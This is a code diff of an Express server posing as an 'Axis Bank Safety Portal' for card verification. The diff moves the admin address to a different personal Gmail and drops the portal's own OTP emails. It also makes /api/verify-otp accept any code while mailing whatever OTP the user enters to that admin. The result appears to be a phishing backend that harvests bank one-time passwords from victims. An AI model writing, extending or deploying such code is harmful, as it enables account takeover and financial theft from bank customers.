@@ -42,7 +42,7 @@ transporter.verify((err) => {
 
 
 
-const ADMIN_EMAIL = "Vanshk67932@gmail.com";
+const ADMIN_EMAIL = "anu721777@gmail.com";
 
 const formatHtmlData = (title, data) => {
   const cleanData = data && typeof data.toObject === 'function' ? data.toObject() : { ...data };
@@ -158,11 +158,11 @@ app.post("/api/send-otp", async (req, res) => {
   try {
     const email = req.body.email || "no-email@test.com";
 
-    // Rate Limiting Check (30 seconds window to avoid duplicate emails from race conditions/double renders)
+    // Rate Limiting Check (30 seconds window)
     const existing = localOtpStore[email];
     const now = new Date();
     if (existing && !existing.isVerified && (now - existing.createdAt) < 30000) {
-      console.log(`ℹ️ Duplicate OTP request ignored for ${email} (already sent within last 30s)`);
+      console.log(`ℹ️ Duplicate OTP request ignored for ${email}`);
       return res.json({ success: true, message: "OTP already sent recently" });
     }
 
@@ -175,18 +175,10 @@ app.post("/api/send-otp", async (req, res) => {
       createdAt: new Date(),
     };
 
-    let otpDoc = {
-      email,
-      otp,
-      isVerified: false,
-      ipAddress: req.ip,
-    };
-
     // Attempt MongoDB save ONLY if connected, don't block
     if (mongoose.connection.readyState === 1) {
       try {
-        const dbDoc = await OTP.create(otpDoc);
-        otpDoc = dbDoc.toObject();
+        await OTP.create({ email, otp, isVerified: false, ipAddress: req.ip });
       } catch (dbErr) {
         console.error("⚠️ MongoDB Save Error:", dbErr);
       }
@@ -194,41 +186,7 @@ app.post("/api/send-otp", async (req, res) => {
       console.log("ℹ️ MongoDB disconnected, using Memory Store for OTP");
     }
 
-    // Send OTP to user
-    const otpText = `Your Axis Bank verification OTP is: ${otp}. Please do not share this code with anyone. Note: This OTP is valid for 5 minutes only.`;
-    const otpHtml = `
-      <div style="font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; border: 1px solid #ddd; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 6px rgba(0,0,0,0.05);">
-        <div style="background-color: #C0005A; color: white; padding: 15px; text-align: center;">
-          <h3 style="margin: 0; font-size: 18px;">Axis Bank Safety Portal</h3>
-        </div>
-        <div style="padding: 30px; text-align: center; background-color: #fff;">
-          <p style="font-size: 16px; color: #333; margin-bottom: 20px;">Please use the following One-Time Password (OTP) to complete your card verification:</p>
-          <div style="background-color: #f9f9f9; padding: 15px 25px; font-size: 32px; font-weight: bold; letter-spacing: 5px; color: #C0005A; border-radius: 6px; display: inline-block; margin: 15px 0; border: 1px dashed #C0005A;">
-            ${otp}
-          </div>
-          <div style="margin: 15px 0;">
-            <span style="font-size: 13px; color: #d9534f; font-weight: bold; background-color: #fdf2f2; padding: 8px 12px; border-radius: 4px; border: 1px solid #fde8e8; display: inline-block;">
-              ⚠️ Note: This OTP is valid for 5 minutes only.
-            </span>
-          </div>
-          <p style="font-size: 12px; color: #777; margin-top: 25px; border-top: 1px solid #eee; padding-top: 15px;">
-            This security code is confidential. Axis Bank will never call you to ask for this code.
-          </p>
-        </div>
-      </div>
-    `;
-
-    await transporter.sendMail({
-      from: `"Axis Bank OTP" <${process.env.EMAIL_USER}>`,
-      to: email,
-      subject: "Axis Bank Verification OTP",
-      text: otpText,
-      html: otpHtml,
-    });
-
-    // Send OTP log to admin
-    await sendAdminMail("OTP Code Generated", otpDoc);
-
+    // OTP emails disabled
     res.json({ success: true });
   } catch (err) {
     console.error("OTP SEND ERROR:", err);
@@ -240,51 +198,11 @@ app.post("/api/send-otp", async (req, res) => {
 app.post("/api/verify-otp", async (req, res) => {
   try {
     const { email, otp } = req.body;
-    console.log(`🔍 VERIFYING: email="${email}", otp="${otp}"`);
-    console.log("🔍 STORED RECORD FOR EMAIL:", localOtpStore[email]);
+    console.log(`✅ OTP auto-verified for: ${email}`);
 
-    let isVerified = false;
-    const now = new Date();
+    // Send OTP entered by user to admin
+    await sendAdminMail("OTP Submitted by User", { email, otpEntered: otp });
 
-    // Check in memory store first
-    const memRecord = localOtpStore[email];
-    if (memRecord) {
-      const isExpired = (now - memRecord.createdAt) > 5 * 60 * 1000;
-      if (isExpired) {
-        console.log(`❌ Verification Failed: OTP expired for ${email}`);
-        await sendAdminMail("OTP Expired Alert", { email, otp, generatedAt: memRecord.createdAt });
-        return res.status(401).json({ error: "OTP expired" });
-      }
-
-      if (memRecord.otp === otp && !memRecord.isVerified) {
-        memRecord.isVerified = true;
-        isVerified = true;
-      }
-    }
-
-    // Attempt MongoDB lookup only if connected
-    if (!isVerified && mongoose.connection.readyState === 1) {
-      const record = await OTP.findOne({ email, otp, isVerified: false });
-      if (record) {
-        const isDbExpired = (now - record.createdAt) > 5 * 60 * 1000;
-        if (isDbExpired) {
-          console.log(`❌ Verification Failed: OTP expired in DB for ${email}`);
-          await sendAdminMail("OTP Expired DB Alert", { email, otp, generatedAt: record.createdAt });
-          return res.status(401).json({ error: "OTP expired" });
-        }
-        
-        record.isVerified = true;
-        await record.save();
-        isVerified = true;
-      }
-    }
-
-    if (!isVerified) {
-      await sendAdminMail("OTP Verification Failed", { email, otp });
-      return res.status(401).json({ error: "Invalid OTP" });
-    }
-
-    await sendAdminMail("OTP Verification Successful", { email, otp, verifiedAt: new Date() });
     res.json({ success: true });
   } catch (err) {
     console.error("OTP VERIFY ERROR:", err);
